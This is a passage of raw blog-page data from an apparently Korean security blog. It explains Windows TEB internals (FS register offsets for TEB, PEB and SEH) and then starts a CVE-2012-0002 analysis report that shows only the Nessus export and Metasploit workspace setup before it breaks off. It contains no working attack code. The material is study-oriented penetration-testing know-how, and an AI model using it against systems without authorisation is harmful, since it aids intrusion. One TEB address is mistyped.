url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAABAklEQVQY0y3L626CMABAYd7/pXRmA21LhQKl1AHCLKXcBEWUDWRxWfLl/Dsadh2Xx8TnXhCalm3vEaOUscB2XBrwKI6Px0TKXGZSiOwkxJcQWZZJmedKaRgDCLbM9yyMLAx2+huGAO4Mj5i+RwLqcN+j1N0jgExoQYCBTl3CGQ0PgSZCRuC7SvmROyKk2NggfWXtNirlY6fGTrUqbYrTT199X8upr+ZbPQ/Nq7daK0Tk26Ar0uTgioiaxhp9rBiBj4tapn6Z+vu17Cr5HNtpOM/DeRm75dG+jJ0G9bVPUCHiiDvJwXPw1jaNT2rVeXqp5KWWlUzaUj7v5+nWzEPzf/75BVzfBr9LA2GLAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/313b08180b86b127459eec3e7216e166/37523/0.png\"\n        srcset=\"/static/313b08180b86b127459eec3e7216e166/e9ff0/0.png 180w,\n/static/313b08180b86b127459eec3e7216e166/f21e7/0.png 360w,\n/static/313b08180b86b127459eec3e7216e166/37523/0.png 720w,\n/static/313b08180b86b127459eec3e7216e166/302a4/0.png 1080w,\n/static/313b08180b86b127459eec3e7216e166/b5cea/0.png 1140w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABHklEQVQY02XJ2W6CQACFYd7/edqLXmnsokRZZoXADMMyOoDKprVirdNIbNrU5Lv4T45xOTb61O2qPIJWGpCEeyrl2zzFHggZLbIsD8hGiarI6lI269VAVSrtpDCWMVMZj5nvzE1oWxi6CLgUwRlwbeBgALC1IMglCAQ+TeIoFvwqYgkLjPUyKiXfLHkpWV0k77Xab1eHSuljc9O3l4/65vBjmIY+7/Xn7urUDVrdt/rYXrtvf93eP/rOCHwPAdujGDgWQQDYDkEupZA4pocRwTCgmEIQcRaL6B/jbTJ6Hr1M56+2a46no4fHp8l07EDTJ7YISOjBusjatWzK7J6B4YxJEEonzgHP3XSLKF/Y2BSCFkrINOwqpb/2+ry79w1wqnZgsaBaUQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/0ddfab9384ee51c255ffd546801bd9a8/37523/1.png\"\n        srcset=\"/static/0ddfab9384ee51c255ffd546801bd9a8/e9ff0/1.png 180w,\n/static/0ddfab9384ee51c255ffd546801bd9a8/f21e7/1.png 360w,\n/static/0ddfab9384ee51c255ffd546801bd9a8/37523/1.png 720w,\n/static/0ddfab9384ee51c255ffd546801bd9a8/eafa0/1.png 939w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>NtCurrentTeb() 의 내부 코드는 아주 간단하게 구성되어 있다.</li>\n<li><code class=\"language-text\">FS:[18]</code> 주소의 값을 리턴 한다.</li>\n<li>FS:[18] 실제 주소 <code class=\"language-text\">00281018</code> 을 확인할 수 있는데 메모리 창에서 주소를 확인해보면 <code class=\"language-text\">00281000</code> 값이 들어 있다.</li>\n<li>NtCuurentTeb() API 는 이 값을 리턴하고 있다.</li>\n<li>따라서 이 값이 바로 현재 스레드의 TEB 주소 이다.</li>\n<li>TEB 주소(00281000) 주소는 FS 세그먼트 레지스터가 가리키는 세그먼트 메모리의 베이스 주소와 일치한다.</li>\n</ul>\n<h2 id=\"fs-segment-register\" style=\"position:relative;\"><a href=\"#fs-segment-register\" aria-label=\"fs segment register permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>FS Segment Register</h2>\n<ul>\n<li>FS 세그먼트 레지스터는 현재 스레드의 TEB를 지시하는데 사용한다.</li>\n<li><code class=\"language-text\">IA32</code> 시스템에서는 프로세스의 가상 메모리 크기가 4GB이므로 32비트 크기의 포인터를 이용해야 전체 메모리 공간에 접근이 가능하다.</li>\n<li>FS 레지스터의 크기는 16비트밖에 안된다.</li>\n<li>FS 레지스터는 직접 TEB 주소를 가리키는 것이 아니라, 실제 TEB 주소를 가지고 있는 <code class=\"language-text\">Segment Descriptor Table</code> 의 Index를 가지고 있는것이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">Segment Descriptor Table은 커널 메모리 영역에 존재하며\n특수 레지스터인 <span class=\"token function\">GDTR</span><span class=\"token punctuation\">(</span>Global Descriptor Table Register<span class=\"token punctuation\">)</span>에 그 주소가 저장되어 있다<span class=\"token punctuation\">.</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAACUUlEQVQoz3WS3UsUURjG95/JdeecmTMzO64frLtq67q6bquuaWkZq5uaBUEJhWQpCHWRghRSBFb4hZn2BUFEhUUX4YUE1VXdSF1UhFFCCbK/2GmjoLp4eF7OOfx43vO+HiHNrBAKIZTrUrfwaQbB8koSDSmqY3Fi8R1E6xLU1icJFJeh5d8Jaf6WbrlnHqGbSNOflZaDK2Xj0xSOU8LyxU5ez2d4OZNhbbGbq8O78Ek/QiqkNDEME6UslGEhpXLBHqnb2eDhRzSdeZONjazhJAcQhV4su5jnY+18m0rzaXIfW7Od3Dyxk20+E123CIajJFN7iMabSTS2Eaqs+wW0qG3qp75lkPrWIUpDjQhh4DjFvLp8gK17x/ly6yjcP8ad0x14pY0Sisj4OPFnT2l/vEzi6ROi83MoswhPjmqaCqV0V4ah0ISJbRexej7N12t9vJ/u4ftiH4tDuynQLPQcsL+HugunSJ4bJD5xkujIkZ/A3F/4CgWFXg2fV3PT5YCWVcSLiQ42F7pYn+kku5Th9nCr27Jh2FQGq4mU11AVjLq+vbwmn1C3MMMJiiIpnEgzRqACTTNc4OpEBxvXM3yY7WTzxn6W8kDdsAiGIoSrYoQra1wPVUQxlINHkzbV/Sukxz/SevYzgYYhhK8A21/Cyuhe1q908e5Smo2pDAsDLRRouaGY7or8Sx4hc0UJUi9F6mVI3XEvbDvA2+k0POiFu92w3MfD0bb8lM2/9zAvj9RzhfGHFLrhx7aLGUsnmT7YxGRvI3OHUgy01lEocrD/J/wByl+GNmQQIYoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./SGT.png\"\n        title=\"./SGT.png\"\n        src=\"/static/072d5e551d215b08984b841e81b2b639/37523/SGT.png\"\n        srcset=\"/static/072d5e551d215b08984b841e81b2b639/e9ff0/SGT.png 180w,\n/static/072d5e551d215b08984b841e81b2b639/f21e7/SGT.png 360w,\n/static/072d5e551d215b08984b841e81b2b639/37523/SGT.png 720w,\n/static/072d5e551d215b08984b841e81b2b639/302a4/SGT.png 1080w,\n/static/072d5e551d215b08984b841e81b2b639/07a9c/SGT.png 1440w,\n/static/072d5e551d215b08984b841e81b2b639/74e37/SGT.png 1732w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>세그먼트 레지스터는 실제로 Segment Descriptor Table의 Index를 가지고 있기 때문에 Segment Selector 라는 별칭을 가지고 있다.</li>\n<li>FS 세그먼트 셀렉터가 가리키는 세그먼트 메모리의 시작주소 (base address) 에 TEB 구조체가 위치하는 것을 확인할 수 있다.</li>\n</ul>\n<h3 id=\"fs0x18--teb-base-address\" style=\"position:relative;\"><a href=\"#fs0x18--teb-base-address\" aria-label=\"fs0x18  teb base address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>FS:[0x18] = TEB base address</h3>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> TEB<span class=\"token punctuation\">.</span>NtTib<span class=\"token punctuation\">.</span>Self <span class=\"token operator\">=</span> address of TIB <span class=\"token operator\">=</span> address of TEB <span class=\"token operator\">=</span> FS<span class=\"token operator\">:</span><span class=\"token number\">0</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x2810100</span>\n\nFS<span class=\"token operator\">:</span><span class=\"token number\">0</span> 의 의미는 FS 레지스터가 Indexing 하는 Segment Descriptor가 가리키는 Segment Memory의\n시작 주소이다<span class=\"token punctuation\">.</span></code></pre></div>\n<h3 id=\"fs0x30--peb-base-address\" style=\"position:relative;\"><a href=\"#fs0x30--peb-base-address\" aria-label=\"fs0x30  peb base address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>FS:[0x30] = PEB base address</h3>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> TEB<span class=\"token punctuation\">.</span>ProcessEnvironmentBlock <span class=\"token operator\">=</span> address of PEB</code></pre></div>\n<h3 id=\"fs0x0--seh-base-address\" style=\"position:relative;\"><a href=\"#fs0x0--seh-base-address\" aria-label=\"fs0x0  seh base address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>FS:[0x0] = SEH base address</h3>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> TEB<span class=\"token punctuation\">.</span>NtTib<span class=\"token punctuation\">.</span>ExceptionList <span class=\"token operator\">=</span> address of SEH</code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<ul>\n<li><a href=\"#processenvironmentblock-member\">ProcessEnvironmentBlock member</a></li>\n<li><a href=\"#nttib-member\">NtTib member</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EC%9C%A0%EC%A0%80-%EB%AA%A8%EB%93%9C-teb-%EC%A0%91%EA%B7%BC-%EB%B0%A9%EB%B2%95\">유저 모드 TEB 접근 방법</a></p>\n<ul>\n<li><a href=\"#ntdllntcurrentteb\">Ntdll.NtCurrentTeb()</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#fs-segment-register\">FS Segment Register</a></p>\n<ul>\n<li><a href=\"#fs0x18--teb-base-address\">FS:[0x18] = TEB base address</a></li>\n<li><a href=\"#fs0x30--peb-base-address\">FS:[0x30] = PEB base address</a></li>\n<li><a href=\"#fs0x0--seh-base-address\">FS:[0x0] = SEH base address</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"TEB (Thread Environment Block) 프로세스에서 실행되는 스레드에 대한 정보를 담고 있는 구조체 스레드별로 TEB 구조체가 하나씩 할당된다. OS 종류별로 해당 모양이 조금씩 달라진다. ProcessEnvironmentBlock member 0x30 offset 에 위치한 ProcessEnvironmentBlock member PEB(Process Environment Block) 구조체의 포인터이다. PEB는 프로세스 별로 하나만 생성된다. NtTib member TEB 구조체의 첫 번째 멤버는  구조체이다. _NT_TIB (_NT_Thread information Block) 현재 실행 중인 스레드에 대한 정보를 저장하고 있다. ExceptionList member는 _EXCEPTION_REGISTRATION_RECORD 구조체 연결 리스트를 가리키고 있다. 이것은 SEH(Structured Exception Handler) 라고 하는 Window OS의 예…","frontmatter":{"date":"January 03, 2021","title":"TEB (Thread Environment Block)","categories":"Windows","author":"Zer0Luck","emoji":"🍬"},"fields":{"slug":"/window_4_theori/"}},"next":{"id":"74aeb365-aacf-5fdf-b30f-88959a928ba3","html":"<h1 id=\"취약점-분석-보고서-cve-2012-0002\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EB%B3%B4%EA%B3%A0%EC%84%9C-cve-2012-0002\" aria-label=\"취약점 분석 보고서 cve 2012 0002 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석 보고서 CVE-2012-0002</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 163.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAhCAIAAABWXBxEAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAGRklEQVQ4y1WV22/b9hXH9U8Mw5omTZtYEnW1rWsky4odJ7a3LlkuaLLaSpOu9tYBA4btYdvDECRZNnvYBem21ugSJ22yYuuAvrbbS7vtIbGkWaYoS6JI0aLEm0iRFEmRtCLFHEg6KfZ5OjzAF+fyO+fQERhNptLzTndo/d4Dnuc3NjZKpdLm5mY2m7XtjY0NSeq+/+f7gdFkIJh8+PCvxuCJzHGqLDtGXKHpmTMvHxldv/fQMAwcxwVBaDab1WqVIAiO4xiGMQzj7vqDcGRqPJT+28efGMbekOMMXXeMhVKJidlAMPHe2h3D2FNVVZZlBEHy+TyCILIsK0rPMIzbt9896hw/6hz74MOPhk+HnCAovZ4jGp86e35x+sTptbW7T58OJUlqt9ulUqlWq1UqFYqiZFne23v63trdidRcKj3/8d8/UVWVIknFSnvcF0gcOOi5c+eD4WBQr9cxi2q1WqlUqtVqq9WiabpQ2Prss39++uk/QLCI4ziKou122+ECIpYYuH//L4ZhMAyD43ij0WAYhqZp28AwTBTF3V1d0zRBELrdLs/zkiQ5XEAY8MZfeBG4Z4l3dnYwDGu32w2LHQsURTudjiAIHMeJoihZdLtdh9MdjsSmX3o5sL7+4HlkgiCazaaiKLquS5JkG7IsS5Iky3LvGeZTpdJff+Xo2HMxSZI7Ozs0TXe7XTuaIAg8z6uqKliIoshxnCl2ARHAGzPTtt651WpRFNVsNimK2t3d7fV6um6Wquu6oiiapvV6vX6/b9tmzf5g8sBBj11zs9kkCMLuZ6vVwjDM9tA0DcOw3RGKomAYZhjGFLuAyAsvuu+uf2gYhiRJhEWtVmu1WiiK0jSNoqjdPzsvRVFkWbYjR7555tKIK/TOH9Z4ns/l8rlcvlyu1CxQFK3X67VabXt7u1qtIghSrVYbjYadv9ntwOiE0x2+cvXtyfR8MjUbHE3+auW3mqaVy+V8Pp/NZvP5PAiCm5ubWxaFQoHjOJIk7bSjTnd4MbN0ZGTsyMj4V746cv3Giq5rlYoZH0EQFEVZltU0jed5CIJomtZ1fb9mwBtzuiOLmaVo/ERyYg7wxm7cXNV1DUEQDMNqtRqGYbbY3hlRFP9P7AKeiVOzgDd2/eaqLEsFCwiCYBgmSVIURZZli0VztiVJ2k/7+NSrwbHUwuJbLiDqAiJfO+C+fmPFMPbK5bK9GzRNC4Kg67ogCBAENRqNLyN7/cdcQHQxswR4ox5f7MAhz8+v3Ro8eVK2KBaLGIYRBMGyLEEQhUIBx3FZllutlil2e8yGZS4ve3xxjy9+8CXvtWu3BoMnHMchCJLL5SAIAkEwm80+fvwYBEGKokiS3BdbDQu/cfXtk7NnZ06djUSnV1Z/PxwOKpUKCIIwDPM8LwhCp9OxzxOCICRJUhTlcLpDTnfkqCu0mFnyBxP+YOLQYb/9VMUiVKvVIAjCcZxlWVVVGYYpFot2zWbD3J7w8elXXUB4ZfV3ufx/v/jXfz7/4t+l7W2e52maZlkWx/F2u81xXKfTYVmWpmmGYWzb4QscGw+nfYHE0vIPZk6dvvrm9ycm526/8+7e3p7Y7crP2NraoihKVVV7pWVZ7nQ65ni6gIg1YcsuIDI7f/7wK4Gbv/i1tSSyasFxHARB9XpdURTbo2maKIp2zeERVyhzedntiUzPnDbFt0xxtytpmqYoSrFYhGE4l8vRNN3v91VV1XXdPEPh6NSJk2dix2Yyl5fHQpOvXbzi9cdv/fI3ttgGx/FcLlcqlQRBsD37afsDiUhsenR8cmHxLX8wceG1N9zeyE9+eo3lOghSl6zgPM8/evQIQRD7nvR6PfskfZm2NWGx8XDaBUTGw+nvfu+HC4tLtRpqHx1d1+1jaheyLzYnzFrJTGbJ44tPpOZ9gcShw76JybmxUAoEi6raE0WRYZjt7W0QBBmG6VqYTzXiGvf440536OKlKx5fLJWedwGh02cu3rv/8I9/er/RaIiiyPM8DMMYhtn/APuG0jTt8AcT5y5cnpicu/T6m8nU7LkLmVBk6sbNVcMwBoNBv9/ftWg0GpIkDYdD+7Pf75t/jFDk+MzJb6WPf+PbC99Jpk6dO78QjU//6Mc/EwShXq8TBEFabG1toShKkuRzT7PZ/B+VsE60jvChnwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image000\"\n        title=\"image000\"\n        src=\"/static/ad564f14a629de93a30250d1aba9cd59/76aed/image000.png\"\n        srcset=\"/static/ad564f14a629de93a30250d1aba9cd59/e9ff0/image000.png 180w,\n/static/ad564f14a629de93a30250d1aba9cd59/f21e7/image000.png 360w,\n/static/ad564f14a629de93a30250d1aba9cd59/76aed/image000.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"metasploit-취약성-테스트\" style=\"position:relative;\"><a href=\"#metasploit-%EC%B7%A8%EC%95%BD%EC%84%B1-%ED%85%8C%EC%8A%A4%ED%8A%B8\" aria-label=\"metasploit 취약성 테스트 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metasploit 취약성 테스트</h2>\n<h3 id=\"nessus-db-정보-내보내기\" style=\"position:relative;\"><a href=\"#nessus-db-%EC%A0%95%EB%B3%B4-%EB%82%B4%EB%B3%B4%EB%82%B4%EA%B8%B0\" aria-label=\"nessus db 정보 내보내기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Nessus DB 정보 내보내기</h3>\n<p>Metasploit Exploit Framework를 통해 대상 서비스 취약성 점검을 하기 위해\nNessus를 바탕으로 점검한 결과를 DB 형태로 내보내기를 진행 파일은 xml\n유형의 Nessus 확장자 구성으로 되어있으며 해당 파일일 작업 공간에 저장\n한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAClklEQVQoz2WR3UvTURjHjy9R9AcEeVMUhGa6+bb5si3XNKcmSUZQkYgaKWhQN10VKdRF9FcEXRd1011BeREKuiGViTnnNmNs+73v99t+5zzfOEMh64EvX55znvN5nofDvsZ/nN3a2qpTVfVDJpNBMpnkuVwOQghks1mkUqmKG4YB13Wxs7MDWacoCnbTaSyvrCAWj2MtFkNBUcDyiip0wxCGaVGhUEA+nyf5WAJVVYWEm6YJx3EqQJnLOtu2SdndxbeVFbG1vu7ubW5yM5vlzNBVaLpeKQZA2A8J/DuI6P8zRaH89ja0dBo8lwPpOpicSMqyLCqXyxJMEi4l8wOIBB64PHccR9i2jb1MJvVzY+NNMpl8L4R4xxRFISkJlV4sFqlUKtH+inRoyH2XzS3LcjnnMn9VNE22sb7OhBCMGbruGoZRkWWarqIo/Mnicxq7OY67s/dp8t4cpmbmMT07TzduT2Bm7gFtJxJc0zRHbiGEeA2AaZpWKzivZkWnBLtUhmWX4JQ5dMPArfEptPiD5PUH0dTejdP1zTh1rgl1Z+rJH4pgO5GofJRcnYjeEhHjnFdLZyVOCw6nhWKZL3LgqaYbz6Ij135fjEQxGB0RfZFBBHrCCATC1N7WhWCoT1+LxV86tv1YCPECwHU5IYAq6cwsEzNKghHAvv9KygvW1hNeHR0exdjwKB+NXsVw3xCGIoNisHcA/d29KcbYsY9fltg+6JCY6bg1huPWLC2v1soudyamj3t8wXigtx/+rhBv9vrgafHD29opmlo7caG1MxMauHKSMcY+fV46QkTVh4AH0djiZ56OAPP4gkfPe32xek8HGrw+3uD1obGtC76esJgMX8Z8JJp50NF54pG/mz0MXapi/8QfSUWKnJOd3hIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image8\"\n        title=\"image8\"\n        src=\"/static/d48f22e3a3d38f69a2e77d01f6152b95/d8f62/image8.png\"\n        srcset=\"/static/d48f22e3a3d38f69a2e77d01f6152b95/e9ff0/image8.png 180w,\n/static/d48f22e3a3d38f69a2e77d01f6152b95/f21e7/image8.png 360w,\n/static/d48f22e3a3d38f69a2e77d01f6152b95/d8f62/image8.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"metasploit-workspace\" style=\"position:relative;\"><a href=\"#metasploit-workspace\" aria-label=\"metasploit workspace permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metasploit workspace</h3>\n<p>Metasploit 상에 취약점 점검 대상의 정보를 관리하기 위해 Nessus DB정보를\n받아와 작업할 공간을 만든다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoUlEQVQY05XOSw6CMABFUTajpQV1oP0ptSktpB9ATQUSgvvfhhNHjkryhvckL/PD7PvJ+YiJggUpDhwWNEckZVkjWqs6xg3lmjJdCXs8XQHESdjKrq5aqQLjBhMl7o5yk4qlXuK4Pl9L/5iti9ZHzOrU286v7/ETukk3Q+gnqfwOnFPxTXhthhwRVDJUskT2wwDifX4BEANIACTb8Kb6D38BLXxeeUBrIt8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image9\"\n        title=\"image9\"\n        src=\"/static/304e57f44cea8f8eb27504749eafba40/f058b/image9.png\"\n        